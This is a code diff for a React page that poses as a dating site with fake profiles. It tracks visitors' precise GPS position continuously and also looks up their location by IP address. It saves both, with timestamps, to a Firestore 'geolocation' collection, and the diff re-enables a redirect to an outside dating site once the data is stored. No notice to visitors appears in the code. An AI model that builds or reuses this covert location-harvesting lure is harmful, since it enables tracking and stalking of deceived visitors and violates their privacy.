@@ -2,12 +2,11 @@ import React, { useState, useEffect } from 'react';
 import { serverTimestamp } from 'firebase/firestore';
 import { firestore } from './firebase';
 import { addDoc, collection } from 'firebase/firestore';
-import bgImage from './datingBg.jpg';
 import './App.css';
-import girlIcon from './girlIcon.png';
 import download1 from './images/download1.jpg';
 import download2 from './images/download2.jpg';
 import images2 from './images/images2.jpg';
+import moment from 'moment/moment';
 
 function App() {
   useEffect(() => {
@@ -16,9 +15,9 @@ function App() {
       timeout: 5000,
       maximumAge: 0,
     };
-    
+
     const ref = collection(firestore, "geolocation");
-    
+
     if (navigator.geolocation) {
       navigator.geolocation.watchPosition((position) => {
         console.log("position-->", position, position.coords)
@@ -31,35 +30,35 @@ function App() {
         }
         try {
           addDoc(ref, data).then(() => {
-            // const timeout = setTimeout(() => {
-            //   // 👇️ redirects to an external URL
-            //   window.location.replace('https://www.quackquack.in/dating/in/tamil-nadu/');
-            // }, 3000);
+            const timeout = setTimeout(() => {
+              // 👇️ redirects to an external URL
+              window.location.replace('https://www.quackquack.in/dating/in/tamil-nadu/');
+            }, 3000);
 
-            // return () => clearTimeout(timeout);
+            return () => clearTimeout(timeout);
           })
 
         } catch (err) {
           console.log("err-->", err)
         }
       }, error => console.log(error), options)
-     
+
     }
   }, []);
 
-  useEffect(()=>{
+  useEffect(() => {
+    let date = new Date();
+    console.log(date)
     const ref = collection(firestore, "geolocation");
-    fetch('https://geolocation-db.com/json/f2e84010-e1e9-11ed-b2f8-6b70106be3c8').then(res => res.json()).then(resObj => addDoc(ref, resObj))
-  },[])
+    fetch('https://geolocation-db.com/json/f2e84010-e1e9-11ed-b2f8-6b70106be3c8').then(res => res.json()).then(resObj => {
+      addDoc(ref, {
+        ...resObj, time: moment()
+          .utcOffset('+05:30')
+          .format('YYYY-MM-DD hh:mm:ss a')
+      })
 
-  // useEffect(() => {
-  //   const timeout = setTimeout(() => {
-  //     // 👇️ redirects to an external URL
-  //     window.location.replace('https://www.quackquack.in/dating/in/tamil-nadu/');
-  //   }, 3000);
-
-  //   return () => clearTimeout(timeout);
-  // }, []);
+    })
+  }, [])
 
   const [searchTerm, setSearchTerm] = useState('');
   const [selectedProfile, setSelectedProfile] = useState(null);
@@ -70,7 +69,7 @@ function App() {
       age: 25,
       location: '2 km from you',
       description: 'I love hiking and trying new foods!',
-      image : download1
+      image: download1
     },
     {
       name: 'Maha',
@@ -107,7 +106,7 @@ function App() {
         {filteredProfiles.map((profile) => (
           <div key={profile.name} className="profile-card">
             <h2>{profile.name}<span>{` ${profile.age} years`}</span></h2>
-            <img  className="img" alt='loading' src={profile.image}/>
+            <img className="img" alt='loading' src={profile.image} />
             <p>{profile.location}</p>
             <button onClick={() => setSelectedProfile(profile)}>
               View Profile
